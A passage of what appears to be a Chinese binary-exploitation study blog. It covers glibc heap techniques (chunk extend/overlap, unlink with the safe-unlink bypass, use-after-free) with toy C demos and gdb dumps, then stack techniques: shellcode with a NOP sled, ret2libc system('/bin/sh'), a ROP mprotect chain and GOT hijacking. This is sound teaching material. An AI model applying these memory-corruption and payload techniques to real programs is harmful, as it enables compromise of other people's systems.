0x00000000000000000x602050: 0x0000000000000000 0x00000000000000000x602060: 0x0000000000000000 0x00000000000000000x602070: 0x0000000000000000 0x00000000000000000x602080: 0x0000000000000000 0x00000000000000000x602090: 0x0000000000000000 0x00000000000000210x6020a0: 0x0000000000000000 0x00000000000000000x6020b0: 0x00000000000000b0 0x0000000000000020 &lt;=== 注意此处标记为空0x6020c0: 0x0000000000000000 0x00000000000000000x6020d0: 0x0000000000000000 0x0000000000020f31 &lt;=== top chunk [+] unsorted_bins[0]: fw=0x602000, bk=0x602000 → Chunk(addr=0x602010, size=0xb0, flags=PREV_INUSE) 再次进行分配的时候就会取回 chunk1 和 chunk2 的空间，此时我们就可以控制 chunk2 中的内容 0x4005b0 &lt;main+74&gt; call 0x400450 &lt;malloc@plt&gt;→ 0x4005b5 &lt;main+79&gt; mov QWORD PTR [rbp-0x8], rax rax : 0x0000000000602010 类型3-对 free 的 smallbin 进行 extend这个类型的利用是在第二种类型的基础上进行的，这次我们先释放 chunk1，然后再修改处于 unsorted bin 中的 chunk1 的 size 域。 int main(){ void *ptr,*ptr1; ptr=malloc(0x80);//分配第一个0x80的chunk1 malloc(0x10);//分配第二个0x10的chunk2 free(ptr);//首先进行释放，使得chunk1进入unsorted bin *(int *)((int)ptr-0x8)=0xb1; ptr1=malloc(0xa0);} 两次 malloc 之后的结果如下： 0x602000: 0x0000000000000000 0x0000000000000091 &lt;=== chunk 10x602010: 0x0000000000000000 0x00000000000000000x602020: 0x0000000000000000 0x00000000000000000x602030: 0x0000000000000000 0x00000000000000000x602040: 0x0000000000000000 0x00000000000000000x602050: 0x0000000000000000 0x00000000000000000x602060: 0x0000000000000000 0x00000000000000000x602070: 0x0000000000000000 0x00000000000000000x602080: 0x0000000000000000 0x00000000000000000x602090: 0x0000000000000000 0x0000000000000021 &lt;=== chunk 20x6020a0: 0x0000000000000000 0x00000000000000000x6020b0: 0x0000000000000000 0x0000000000020f51 我们首先释放 chunk1 使它进入 unsorted bin 中： unsorted_bins[0]: fw=0x602000, bk=0x602000 → Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE)0x602000: 0x0000000000000000 0x0000000000000091 &lt;=== 进入unsorted bin0x602010: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 &lt;=== fd，bk0x602020: 0x0000000000000000 0x00000000000000000x602030: 0x0000000000000000 0x00000000000000000x602040: 0x0000000000000000 0x00000000000000000x602050: 0x0000000000000000 0x00000000000000000x602060: 0x0000000000000000 0x00000000000000000x602070: 0x0000000000000000 0x00000000000000000x602080: 0x0000000000000000 0x00000000000000000x602090: 0x0000000000000090 0x0000000000000020 &lt;=== chunk 20x6020a0: 0x0000000000000000 0x00000000000000000x6020b0: 0x0000000000000000 0x0000000000020f51 &lt;=== top chunk 然后篡改 chunk1 的 size 域： 0x602000: 0x0000000000000000 0x00000000000000b1 &lt;=== size域被篡改0x602010: 0x00007ffff7dd1b78 0x00007ffff7dd1b780x602020: 0x0000000000000000 0x00000000000000000x602030: 0x0000000000000000 0x00000000000000000x602040: 0x0000000000000000 0x00000000000000000x602050: 0x0000000000000000 0x00000000000000000x602060: 0x0000000000000000 0x00000000000000000x602070: 0x0000000000000000 0x00000000000000000x602080: 0x0000000000000000 0x00000000000000000x602090: 0x0000000000000090 0x00000000000000200x6020a0: 0x0000000000000000 0x00000000000000000x6020b0: 0x0000000000000000 0x0000000000020f51 此时再进行 malloc 分配就可以得到 chunk1+chunk2 的堆块，从而控制了 chunk2 的内容。 Chunk Extend/Shrink 可以做什么?一般来说，这种技术并不能直接控制程序的执行流程，但是可以控制 chunk 中的内容。如果 chunk 存在字符串指针、函数指针等，就可以利用这些指针来进行信息泄漏和控制执行流程。 此外通过 extend 可以实现 chunk overlapping，通过 overlapping 可以控制 chunk 的 fd/bk 指针从而可以实现 fastbin attack 等利用。 类型4-通过 extend 后向 overlapping这里展示通过 extend 进行后向 overlapping，这也是在 CTF 中最常出现的情况，通过 overlapping 可以实现其它的一些利用。 int main(){ void *ptr,*ptr1; ptr=malloc(0x10);//分配第1个 0x10 的chunk1 malloc(0x10); //分配第2个 0x10 的chunk2 malloc(0x10); //分配第3个 0x10 的chunk3 malloc(0x10); //分配第4个 0x10 的chunk4 *(int *)((int)ptr-0x8)=0x61; free(ptr); ptr1=malloc(0x50);} 在 malloc(0x50) 对 extend 区域重新占位后，其中 0x10 的 fastbin 块依然可以正常的分配和释放，此时已经构成 overlapping，通过对 overlapping 的进行操作可以实现 fastbin attack。 类型5-通过 extend 前向 overlapping这里展示通过修改 pre_inuse 域和 pre_size 域实现合并前面的块 int main(void){ void *ptr1,*ptr2,*ptr3,*ptr4; ptr1=malloc(128);//smallbin1 ptr2=malloc(0x10);//fastbin1 ptr3=malloc(0x10);//fastbin2 ptr4=malloc(128);//smallbin2 malloc(0x10);//防止与top合并 free(ptr1); *(int *)((long long)ptr4-0x8)=0x90;//修改pre_inuse域 *(int *)((long long)ptr4-0x10)=0xd0;//修改pre_size域 free(ptr4);//unlink进行前向extend malloc(0x150);//占位块} 前向 extend 利用了 smallbin 的 unlink 机制，通过修改 pre_size 域可以跨越多个 chunk 进行合并实现 overlapping。 Unlink(没搞特别懂)漏洞原理我们在利用 unlink 所造成的漏洞时，其实就是对 chunk 进行内存布局，然后借助 unlink 操作来达成修改指针的效果。 unlink操作就是把一个双向链表中的空闲块拿出来（例如 free 时和目前物理相邻的 free chunk 进行合并）。其基本的过程如下： 古老的unlink在最初 unlink 实现的时候，其实是没有对 chunk 的 size 检查和双向链表检查的，即没有如下检查代码： // 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \\ malloc_printerr (\"corrupted size vs. prev_size\"); \\// 检查 fd 和 bk 指针(双向链表完整性检查)if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\ malloc_printerr (check_action, \"corrupted double-linked list\", P, AV); \\ // largebin 中 next_size 双向链表完整性检查 if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0) \\ || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0)) \\ malloc_printerr (check_action, \\ \"corrupted double-linked list (not small)\", \\ P, AV); 这里我们以 32 位为例，假设堆内存最初的布局是下面的样子： 现在有物理空间连续的两个 chunk（Q，Nextchunk），其中 Q 处于使用状态、Nextchunk 处于释放状态。那么如果我们通过某种方式（比如溢出）将 Nextchunk 的 fd 和 bk 指针修改为指定的值。则当我们 free(Q) 时： 1、glibc 判断这个块是 small chunk 2、判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并 3、判断后向合并，发现后一个 chunk 处于空闲状态，需要合并 4、继而对 Nextchunk 采取 unlink 操作 那么 unlink 具体执行的效果是什么样子呢？我们可以来分析一下： 1、FD=P-&gt;fd = target addr -12 2、BK=P-&gt;bk = expect value 3、FD-&gt;bk = BK，即 *(target addr-12+12)=BK=expect value 4、BK-&gt;fd = FD，即 *(expect value +8) = FD = target addr-12 我们似乎可以通过 unlink 直接实现任意地址读写的目的，但是我们还是需要确保 expect value +8 地址具有可写的权限。 比如说我们将target addr设置为某个 got 表项，那么当程序调用对应的 libc 函数时，就会直接执行我们设置的值（expect value）处的代码。需要注意的是，expect value+8 处的值被破坏了，需要想办法绕过。 当前的unlink刚才考虑的是没有检查的情况，但是一旦加上检查，就没有这么简单了。我们看一下对 fd 和 bk 的检查： // fd bkif (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\ malloc_printerr (check_action, \"corrupted double-linked list\", P, AV); \\ 此时： FD-&gt;bk = target addr - 12 + 12=target_addr BK-&gt;fd = expect value + 8 那么我们上面所利用的修改 GOT 表项的方法就可能不可用了。但是我们可以通过伪造的方式绕过这个机制。 首先我们通过覆盖，将 nextchunk 的 FD 指针指向了 fakeFD，将 nextchunk 的 BK 指针指向了 fakeBK 。那么为了通过验证，我们需要： fakeFD -&gt; bk == P &lt;=&gt; *(fakeFD + 12) == P fakeBK -&gt; fd == P &lt;=&gt; *(fakeBK + 8) == P 当满足上述两式时，可以进入 Unlink 的环节，进行如下操作： fakeFD -&gt; bk = fakeBK &lt;=&gt; *(fakeFD + 12) = fakeBK fakeBK -&gt; fd = fakeFD &lt;=&gt; *(fakeBK + 8) = fakeFD 如果让 fakeFD + 12 和 fakeBK + 8 指向同一个指向 P 的指针，那么： *P = P - 8 *P = P - 12 即通过此方式，P 的指针指向了比自己低 12 的地址处。此方法虽然不可以实现任意地址写，但是可以修改指向 chunk 的指针，这样的修改是可以达到一定的效果的。 如果我们想要使得两者都指向 P，只需要按照如下方式修改即可： 需要注意的是，这里我们并没有违背下面的约束，因为 P 在 Unlink 前是指向正确的 chunk 的指针。 // 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \\ malloc_printerr (\"corrupted size vs. prev_size\"); \\ 此外，其实如果我们设置 next chunk 的 fd 和 bk 均为 nextchunk 的地址也是可以绕过上面的检测的。但是这样的话，并不能达到修改指针内容的效果。 利用思路 1、条件 UAF ，可修改 free 状态下 small bin 或是 unsorted bin 的 fd 和 bk 指针 已知位置存在一个指针指向可进行 UAF 的 chunk 2、效果使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18 3、思路设指向可 UAF chunk 的指针的地址为 ptr： 修改 fd 为 ptr - 0x18 修改 bk 为 ptr - 0x10 触发 unlink ptr 处的指针会变为 ptr - 0x18。 Use After Free漏洞原理简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况： 1、内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃； 2、内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转； 3、内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。 而我们一般所指的Use After Free漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为dangling pointer。 一个简单的示例代码： #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct name { char *myname; void (*func)(char *str);} NAME;void myprint(char *str) { printf(\"%s\\n\", str); }void printmyname() { printf(\"call print my name\\n\"); }int main() { NAME *a; a = (NAME *)malloc(sizeof(struct name)); a-&gt;func = myprint; a-&gt;myname = \"I can also use it\"; a-&gt;func(\"this is my function\"); // free without modify free(a); a-&gt;func(\"I can also use it\"); // free with modify a-&gt;func = printmyname; a-&gt;func(\"this is my function\"); // set NULL a = NULL; printf(\"this pogram will crash...\\n\"); a-&gt;func(\"can not be printed...\");} 运行结果如下： ➜ use_after_free git:(use_after_free) ✗ ./use_after_free this is my functionI can also use itcall print my namethis pogram will crash...[1] 38738 segmentation fault (core dumped) ./use_after_free 可见被free掉的chunk又被成功访问了。","link":"/2020/06/01/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/"},{"title":"入坑二进制","text":"作为一名WEB菜狗，今天决定入坑二进制了，出于极大的好奇心和求知欲（其实就是自己太菜了，急需拓展知识啊~），加上也有些计算机原理的一些基础，想着不能把学的东西给废掉、扔掉，所以决定入坑！ 环境配置1、安装gdb和插件pada从基础做起，安装gdb以及其插件pada sudo apt-get install gdb 这里可能还需要安装一些库，依据需要安装即可，之后安装插件pada，二进制必备插件 git clone https://github.com/longld/peda.git ~/peda git把库拉下来之后，把source ~/peda/peda.py 写入~/.gdbinit echo \"source ~/peda/peda.py\" &gt;&gt; ~/.gdbinit 装pada的时候也有用pip装的，但是可能导致gdb版本与python版本不匹配的问题，如果gdb自动绑定python3的话，直接pip下来的pada用着会报错。 安装完毕，测试： 2、安装checksecchecksec可以查看目标文件开启了哪些保护机制，是玩二进制不可缺少的工具。上一步装的pada插件里其实是包含checksec的，但是版本比较久。可以自己安装，这样可以有效控制高版本 git clone https://github.com/slimm609/checksec.sh.gitcd checksec.shsudo ln –sf checksec /usr/bin/checksec 如果装的有旧版的checksec，此时创建软链接可能会失败，而且就算创建成功，启动checksec检查可能还是旧版，因为并没有进行所有的替换： 这里的Arch是程序架构信息，可以得知程序是64位还是32位的，有助于为编写exp提供信息。其他的内容就是保护机制开启的情况了，后面深入学习。 有效办法是先找一下旧版的文件都存在哪些文件夹下面，用find / -name checksec命令查找： 然后全部替换，再次测试： 可以看到新版会进行更多的保护机制的测试。 由于pada内置有旧版的checksec（跟前面替换的旧版不是同一个），在用gdb调试之前进行检测的话，仍然是旧版： 两个版本共存，也挺好~ 浅学ELF保护机制上一节提到了检查文件的保护机制，这一节就记录一下Linux文件的保护机制相关知识，以后的学习免不了都会遇到。 RELRORelocation Read Only， 重定位表只读。重定位表即.got和.plt两个表。此项技术主要针对 GOT 改写的攻击方式，分为两种：Partial RELRO和Full RELRO。Partical RELRO易受到攻击，例如攻击者可以atoi.got为system.plt，进而输入/bin/sh\\x00获得shell。Full RELRO使整个GOT只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。 Stack-canaryCanary是金丝雀的意思，技术上表示最先的测试的意思。这个来自以前挖煤的时候，矿工都会先把金丝雀放进矿洞，或者挖煤的时候一直带着金丝雀。金丝雀对甲烷和一氧化碳浓度比较敏感，会先报警。所以大家都用canary来搞最先的测试。stack canary表示栈的报警保护。 在函数返回值之前添加的一串随机数（不超过机器字长），末位为/x00（提供了覆盖最后一字节输出泄露canary的可能），如果出现缓冲区溢出攻击，覆盖内容覆盖到canary处，就会改变原本该处的数值，当程序执行到此处时，会检查canary值是否跟开始的值一样，如果不一样，程序会崩溃，从而达到保护返回地址的目的。 NXNon-Executable Memory，不可执行内存。NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。栈溢出的核心就是通过局部变量覆盖返回地址，然后加入shellcode，NX策略是使栈区域的代码无法执行。 绕过这类保护最常见的方法为ROP(Return-Oriented Programming，返回导向编程)，利用栈溢出在栈上布置地址，每个内存地址对应一个gadget，利用ret等指令进行衔接来执行某项功能，最终达到pwn掉程序的目的。 看到网上师傅说：当NX保护开启，就表示题目给了system（'/bin/sh'），如果关闭，表示你需要去构造shellcode。这个慢慢学吧。 ALSRAddress space layout randomization，地址空间布局随机化。是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化将数据随机放置，增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。 但是地址随机化不是对所有模块和内存区都进行随机化，虽然libc、栈、堆的加载位置被随机化，但主镜像不会，这也是绕过的关键手段。 PIEPosition-Independent Executable， 位置无关可执行文件。与ASLR技术类似，ASLR将程序运行时的堆栈以及共享库的加载地址随机化, 而PIE技术则在编译时将程序编译为位置无关, 即程序运行时各个段（如代码段等）加载的虚拟地址也是在装载时才确定。 这就意味着， 在PIE和ASLR同时开启的情况下， 攻击者将对程序的内存布局一无所知， 传统的改写GOT表项的方法也难以进行， 因为攻击者不能获得程序的.got段的虚地址。 RPATH/RUNPATH程序运行时的环境变量，运行时所需要的共享库文件优先从该目录寻找，可以fake lib造成攻击。参考实例。 FORTIFY由GCC实现的源码级别的保护机制，其功能是在编译的时候检查源码以避免潜在的缓冲区溢出等错误。加了这个保护之后,一些敏感函数如read, fgets,memcpy, printf等等可能导致漏洞出现的函数都会被替换成__read_chk，__fgets_chk，__memcpy_chk，__printf_chk等。 这些带了chk的函数会检查读取/复制的字节长度是否超过缓冲区长度，通过检查诸如%n之类的字符串位置是否位于可能被用户修改的可写地址，避免了格式化字符串跳过某些参数（如直接%7$x）等方式来避免漏洞出现。 以上就是了解到的PWN中常见的ELF文件的保护机制了，以后学习过程中逐步深入了解。 关于寄存器在进行常用的一些技术学习之前，还需温习一下之前学过的关于寄存器的知识，毕竟是基础的基础。 32位x86架构下的寄存器可以被简单分为通用寄存器和特殊寄存器两类，通用寄存器在大部分汇编指令下是可以任意使用的（虽然有些指令规定了某些寄存器的特定用途），而特殊寄存器只能被特定的汇编指令使用，不能用来任意存储数据。 通用寄存器包括：一般寄存器eax、ebx、ecx、edx，索引寄存器esi、edi，以及堆栈指针寄存器esp、ebp。其中各类寄存器的作用如下： 一般寄存器：用来存储运行时数据，是指令最常用到的寄存器，除了存放一般性的数据，每个一般寄存器都有自己较为固定的独特用途。eax被称为累加寄存器（Accumulator），用以进行算数运算和返回函数结果等。ebx被称为基址寄存器（Base），在内存寻址时（比如数组运算）用以存放基地址。ecx被称为记数寄存器（Counter），用以在循环过程中记数。edx被称为数据寄存器（Data），常配合eax一起存放运算结果等数据。 索引寄存器：通常用于字符串操作中，esi指向要处理的数据地址（Source Index），edi指向存放处理结果的数据地址（Destination Index）。 堆栈指针寄存器esp、ebp用于保存函数在调用栈中的状态，即栈顶和栈底。 特殊寄存器包括：段地址寄存器ss、cs、ds、es、fs、gs，标志位寄存器EFLAGS，以及指令指针寄存器eip。 现代操作系统内存通常是以分段的形式存放不同类型的信息的。函数调用栈就是分段的一个部分（Stack Segment）。内存分段还包括堆（Heap Segment）、数据段（Data Segment）、BSS段以及代码段（Code Segment）。代码段存储可执行代码和只读常量（如常量字符串），属性可读可执行，但通常不可写。数据段存储已经初始化且初值不为0的全局变量和静态局部变量，BSS段存储未初始化或初值为0的全局变量和静态局部变量，这两段数据都有可写的属性。堆用于存放程序运行中动态分配的内存，C语言中的malloc()和free()函数就是在堆上分配和释放内存。各段在内存的排列如下图所示： 几种特殊寄存器用途如下： 段地址寄存器：用来存储内存分段地址的，其中寄存器ss存储函数调用栈的地址，寄存器cs存储代码段的地址，寄存器ds存储数据段的地址，es、fs、gs是附加的存储数据段地址的寄存器。 标志位寄存器（EFLAGS）：32位中的大部分被用于标志数据或程序的状态，例如OF（Overflow Flag）对应数值溢出、IF（Interrupt Flag）对应中断、ZF（Zero Flag）对应运算结果为0、CF（Carry Flag）对应运算产生进位等。 指令指针寄存器（eip）：存储下一条运行指令的地址。 了解了各类寄存器的用途，下面学习常用的漏洞利用方法手段。 常用技术方法首先需要深入理解栈的工作原理，参考这里。 在发生函数调用或者结束函数调用时，程序的控制权会在函数状态之间发生跳转，这时通过修改函数状态来实现攻击。而控制程序执行指令最关键的寄存器就是eip（存放下一条要执行指令的地址），所以我们的目标就是让eip载入攻击指令的地址。 如果要让eip指向攻击指令，需要做的工作：首先，在退栈过程中，返回地址会被传给eip，所以我们只需要让溢出数据用攻击指令的地址来覆盖返回地址就可以了。其次，我们可以在溢出数据内包含一段攻击指令，也可以在内存其他位置寻找可用的攻击指令。如下图： 再来看看函数调用发生时，如果要让eip指向攻击指令，需要哪些准备？这时，eip会指向原程序中某个指定的函数，我们没法通过改写返回地址来控制，不过我们可以“偷梁换柱”－－将原本指定的函数在调用时替换为其他函数。 实现上述的攻击目的，主要有以下技术手段： 1、Shellcode：修改返回地址，让其指向溢出数据中的一段指令 2、Return2libc：修改返回地址，让其指向内存中已有的某个函数 3、ROP：修改返回地址，让其指向内存中已有的一段指令 4、Hijack GOT：修改某个被调用函数的地址，让其指向另一个函数 下面详细记录几种方法的学习： Shellcode 修改返回地址，让其指向溢出数据中的一段指令 该技术要完成的任务包括：在溢出数据内包含一段攻击指令，用攻击指令的起始地址覆盖掉返回地址。攻击指令一般都是用来打开shell，从而可以获得当前进程的控制权，所以这类指令片段也被成为shellcode。shellcode可以用汇编语言来写再转成对应的机器码，也可以上网搜索直接复制粘贴，以后深入学习。 溢出数据的组成如下： payload = padding1 + address of shellcode + padding2 + shellcode 其在栈内的分布如下图： 这里对溢出数据的组成详细说明一下： padding1处的数据可以随意填充（注意如果利用字符串程序输入溢出数据不要包含\\x00，否则向程序传入溢出数据时会造成截断），长度应该刚好覆盖函数的基地址。address of shellcode是后面shellcode起始处的地址，用来覆盖返回地址。padding2处的数据也可以随意填充，长度可以任意。shellcode应该为十六进制的机器码格式。 根据上面的构造，我们要解决以下两个问题： 1、 返回地址之前的填充数据padding1应该多长？ 我们可以用调试工具（例如gdb）查看汇编代码来确定这个距离，也可以在运行程序时用不断增加输入长度的方法来试探（如果返回地址被无效地址例如AAAA覆盖，程序会终止并报错）。 2、shellcode起始地址应该是多少？ 我们可以在调试工具里查看返回地址的位置（可以查看ebp的内容然后再加4（32位机），参见前面关于函数状态的链接），可是在调试工具里的这个地址和正常运行时并不一致，这是运行时环境变量等因素有所不同造成的。所以这种情况下我们只能得到大致但不确切的shellcode起始地址，解决办法是在padding2里填充若干长度的\\x90。这个机器码对应的指令是NOP(No Operation)，也就是告诉CPU什么也不做，然后跳到下一条指令。有了这一段NOP的填充，只要返回地址能够命中这一段中的任意位置，都可以无副作用地跳转到shellcode的起始处，所以这种方法被称为NOP Sled（中文含义是“滑雪橇”）。这样我们就可以通过增加NOP填充来配合试验shellcode起始地址。 另外，操作系统可以将函数调用栈的起始地址设为随机化（这种技术被称为内存布局随机化，即Address Space Layout Randomization (ASLR)），这样程序每次运行时函数返回地址会随机变化。反之如果操作系统关闭了上述的随机化（这是技术可以生效的前提），那么程序每次运行时函数返回地址会是相同的，这样我们可以通过输入无效的溢出数据来生成core文件，再通过调试工具在core文件中找到返回地址的位置，从而确定shellcode的起始地址。 解决完上述问题，就可以拼接出最终的溢出数据，输入至程序来执行shellcode了。 这种方法生效的一个前提是在函数调用栈上的数据（shellcode）要有可执行的权限（另一个前提是关闭内存布局随机化）。很多时候操作系统会关闭函数调用栈的可执行权限，这样 shellcode 的方法就失效了，不过我们还可以尝试使用内存里已有的指令或函数，毕竟这些部分本来就是可执行的，所以不会受上述执行权限的限制。这种情况包括Return2libc和ROP两种方法。 Return2libc 修改返回地址，让其指向内存中已有的某个函数 该方法要完成的任务包括：在内存中确定某个函数的地址，并用其覆盖掉返回地址。由于libc动态链接库中的函数被广泛使用，所以有很大概率可以在内存中找到该动态库。同时由于该库包含了一些系统级的函数，所以通常使用这些系统级函数来获得当前进程的控制权。鉴于要执行的函数可能需要参数，比如调用system函数打开shell的完整形式为system(“/bin/sh”)，所以溢出数据也要包括必要的参数。下面以执行system(“/bin/sh”)为例，先写出溢出数据的组成，再确定对应的各部分填充进去。 溢出数据组成如下： payload = padding1 + address of system() + padding2 + address of “/bin/sh” 溢出数据各部分含义如下： padding1处的数据可以随意填充（注意不要包含\\x00，否则向程序传入溢出数据时会造成截断），长度应该刚好覆盖函数的基地址。address of system()是system在内存中的地址，用来覆盖返回地址。padding2处的数据长度为4（32位机），对应调用system时的返回地址。因为我们在这里只需要打开shell就可以，并不关心从shell退出之后的行为，所以padding2的内容可以随意填充。address of “/bin/sh”是字符串/bin/sh在内存中的地址，作为传给system的参数。 根据上面的构造，我们要解决以下两个问题： 1、返回地址之前的填充数据padding1应该多长？ 解决方法和shellcode中提到的答案一样。 2、system函数地址应该是多少？ 首先要知道程序是如何调用动态链接库中的函数的：当函数被动态链接至程序中，程序在运行时首先确定动态链接库在内存的起始地址，再加上函数在动态库中的相对偏移量，最终得到函数在内存的绝对地址。在ASLR被关闭的前提下，我们可以通过调试工具在运行程序过程中直接查看system的地址，也可以查看动态库在内存的起始地址，再在动态库内查看函数的相对偏移位置，通过计算得到函数的绝对地址。而当ASLR开启的时候，会将动态库加载的起始地址做随机化处理，程序每次运行时动态库的起始地址都会变化，也就无从确定库内函数的绝对地址。 3、/bin/sh的地址在哪里？ 可以在动态库里搜索字符串/bin/sh，如果存在，就可以按照动态库起始地址＋相对偏移来确定其绝对地址。如果在动态库里找不到，可以将这个字符串加到环境变量里，再通过getenv等函数来确定地址。 解决完上述问题，就可以拼接出溢出数据，输入至程序来通过system获取shell了。 ROP 修改返回地址，让其指向内存中已有的一段指令 该方法要完成的任务包括：在内存中确定某段指令的地址，并用其覆盖返回地址。可是既然可以覆盖返回地址并定位到内存地址，为什么不直接用上篇提到的return2libc呢？因为有时目标函数在内存内无法找到，有时目标操作并没有特定的函数可以完美适配。这时就需要在内存中寻找多个指令片段，拼凑出一系列操作来达成目的。假如要执行某段指令（将其称为gadget，意为小工具），溢出数据应该以下面的方式构造（padding长度和内容的确定方式参见上篇）： payload = padding + address of gadget 溢出数据在栈中的分布如下图： 而如果想连续执行若干段指令，就需要每个gadget执行完毕可以将控制权交给下一个gadget。所以gadget的最后一步应该是RET指令，这样程序的控制权（eip）才能得到切换，所以这种技术被称为返回导向编程（Return Oriented Programming）。要执行多个gadget，溢出数据应该以下面的方式构造： payload = padding + address of gadget 1 + address of gadget 2 + ...... + address of gadget n 在这样的构造下，被调用函数返回时会跳转执行gadget 1，执行完毕时gadget 1的RET指令会将此时的栈顶数据（也就是gadget 2的地址）弹出至eip，程序继续跳转执行gadget 2，以此类推。 多个gadget的溢出数据在栈中分布如下： 现在任务可以分解为：针对程序栈溢出所要实现的效果，找到若干段以ret作为结束的指令片段，按照上述的构造将它们的地址填充到溢出数据中。所以我们要解决以下几个问题： 1、栈溢出之后要实现什么效果？ ROP常见的拼凑效果是实现一次系统调用，Linux系统下对应的汇编指令是int 0x80。执行这条指令时，被调用函数的编号应存入eax，调用参数应按顺序存入ebx，ecx，edx，esi，edi中。例如，编号125对应函数：mprotect (void *addr, size_t len, int prot)，可用该函数将栈的属性改为可执行，这样就可以使用shellcode了。假如我们想利用系统调用执行这个函数，eax、ebx、ecx、edx应该分别为：125、内存栈的分段地址（可以通过调试工具确定）、0x10000（需要修改的空间长度，也许需要更长）、7（RWX 权限）。 2、如何寻找对应的指令片段？ 有若干开源工具可以实现搜索以ret结尾的指令片段，著名的包括ROPgadget、rp++、ropeme等，甚至也可以用grep等文本匹配工具在汇编指令中搜索ret再进一步筛选。 3、如何传入系统调用的参数？ 对于上面提到的mprotect函数，我们需要将参数传输至寄存器，可以用pop指令将栈顶数据弹入寄存器。如果在内存中能找到直接可用的数据，也可以用mov指令来进行传输，不过写入数据再 pop要比先搜索再mov来的简单，如果要用pop指令来传输调用参数，就需要在溢出数据内包含这些参数，所以上面的溢出数据格式需要一点修改。对于单个gadget，pop所传输的数据应该在 gadget地址之后，如下图所示。 在调用mprotect()为栈开启可执行权限之后，我们希望执行一段shellcode，所以要将shellcode也加入溢出数据，并将shellcode的开始地址加到int 0x80的gadget之后。但确定shellcode在内存的确切地址是很困难的事，我们可以使用push esp这个gadget。 我们假设现在内存中可以找到如下几条指令： pop eax; ret; # pop stack top into eaxpop ebx; ret; # pop stack top into ebxpop ecx; ret; # pop stack top into ecxpop edx; ret; # pop stack top into edxint 0x80; ret; # system callpush esp; ret; # push address of shellcode 对于所有包含pop指令的gadget，在其地址之后都要添加pop的传输数据，同时在所有gadget最后包含一段shellcode，最终溢出数据结构应该变为如下格式： payload = padding + address of gadget 1 + param for gadget 1 + address of gadget 2 + param for gadget 2 + ...... + address of gadget n + shellcode 为了简单，假定输入溢出数据不受\\x00字符的影响，所以payload可以直接包含\\x7d\\x00\\x00\\x00（传给eax的参数125）。如果希望实现更为真实的操作，可以用多个gadget通过运算得到上述参数。比如可以通过下面三条gadget来给eax传递参数： pop eax; ret; # pop stack top 0x1111118e into eaxpop ebx; ret; # pop stack top 0x11111111 into ebxsub eax, ebx; ret; # eax -= ebx 解决完上述问题，我们就可以拼接出溢出数据，输入至程序来为程序调用栈开启可执行权限并执行 shellcode。同时，由于ROP方法带来的灵活性，现在不再需要痛苦地试探shellcode起始地址了。回顾整个输入数据，只有栈的分段地址需要获取确定地址。如果利用gadget读取ebp的值再加上某个合适的数值，就可以保证溢出数据都具有可执行权限，这样就不再需要获取确切地址，也就具有了绕过内存随机化的可能。 实际搜索及拼接gadget时，并不会像上面一样顺利，有两个方面需要注意： 1、很多时候并不能一次凑齐全部的理想指令片段，这时就要通过数据地址的偏移、寄存器之间的数据传输等方法来“曲线救国”。举个例子，假设找不到下面这条gadget： pop ebx; ret; 但假如可以找到下面的gadget： mov ebx, eax; ret; 就可以将它和 pop eax; ret; 组合起来实现将数据传输给ebx的功能。上面提到的用多个gadget避免输入\\x00也是一个实例应用。 2、要小心gadget是否会破坏前面各个gadget已经实现的部分，比如可能修改某个已经写入数值的寄存器。另外，要特别小心gadget对ebp和esp的操作，因为它们的变化会改变返回地址的位置，进而使后续的gadget无法执行。 Hijack GOT 修改某个被调用函数的地址，让其指向另一个函数 该方法要完成的任务包括：在内存中修改某个函数的地址，使其指向另一个函数。为了便于理解，不妨假设修改printf()函数的地址使其指向system()，这样修改之后程序内对 printf()的调用就执行system()函数。要实现这个过程，我们就要弄清楚发生函数调用时程序是如何找到被调用函数的。 程序对外部函数的调用需要在生成可执行文件时将外部函数链接到程序中，链接的方式分为静态链接和动态链接。静态链接得到的可执行文件包含外部函数的全部代码，动态链接得到的可执行文件并不包含外部函数的代码，而是在运行时将动态链接库（若干外部函数的集合）加载到内存的某个位置，再在发生调用时去链接库定位所需的函数。 程序是如何在链接库内定位到所需的函数呢？ 这个过程用到了两张表：GOT和PLT。GOT全称是全局偏移量表（Global Offset Table），用来存储外部函数在内存的确切地址。GOT存储在数据段内，可以在程序运行中被修改。PLT全称是程序链接表（Procedure Linkage Table），用来存储外部函数的入口点（entry），换言之程序总会到PLT这里寻找外部函数的地址。PLT存储在代码段内，在运行之前就已经确定并且不会被修改，所以PLT并不会知道程序运行时动态链接库被加载的确切位置。那么PLT表内存储的入口点是什么呢？ 就是GOT表中对应条目的地址： 